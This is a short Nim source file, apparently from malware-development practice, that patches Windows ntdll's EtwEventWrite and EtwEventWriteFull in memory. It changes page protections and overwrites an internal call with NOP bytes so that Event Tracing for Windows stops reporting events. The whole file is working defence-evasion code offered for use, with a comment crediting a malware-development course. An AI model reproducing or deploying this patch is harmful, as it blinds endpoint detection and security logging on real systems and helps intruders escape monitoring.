import winim, os, ptr_math

var patchByteArray: array[5, byte] = [byte 0x90, 0x90, 0x90, 0x90, 0x90]
# nop, nop, nop, nop
# nopping out call XX_XX_XX_XX (5 bytes in total)


# Thanks to maldev academy for this method, I modified it a little bit so it doesnt use two for loops.

proc PatchCallInEtwFunc*(fnAddr: PBYTE): bool =
    
    var cw = 0

    while true:

        # check for ret, in this case we are done with the function.
        if (cast[PBYTE](fnAddr + cw)[] == 0xC3):
            return false

        # found call instruction -> check if theres a ret after freeing the stack (add rsp, X)

        if (cast[PBYTE](fnAddr + cw)[] == 0xE8 and cast[PBYTE](fnAddr + cw + 4 + 1 + 4)[] == 0xC3):
            var instrAddr = cast[PVOID](fnAddr + cw)
            var oldPro: DWORD
            VirtualProtect(instrAddr, 5, PAGE_EXECUTE_READWRITE, &oldPro)
            copyMem(instrAddr, &patchByteArray[0], 5)
            VirtualProtect(instrAddr, 5, oldPro, &oldPro)
            return true

        cw = cw + 1



var EEW = GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWrite")
var EEWF = GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWriteFull")

if PatchCallInEtwFunc(cast[PBYTE](EEW)) and PatchCallInEtwFunc(cast[PBYTE](EEWF)):
    echo("Patched EtwpEventWriteFull In Both EtwEventWrite Functions")
else:
    echo("Failed To Patch EtwpEventWriteFull In Both EtwEventWrite Functions")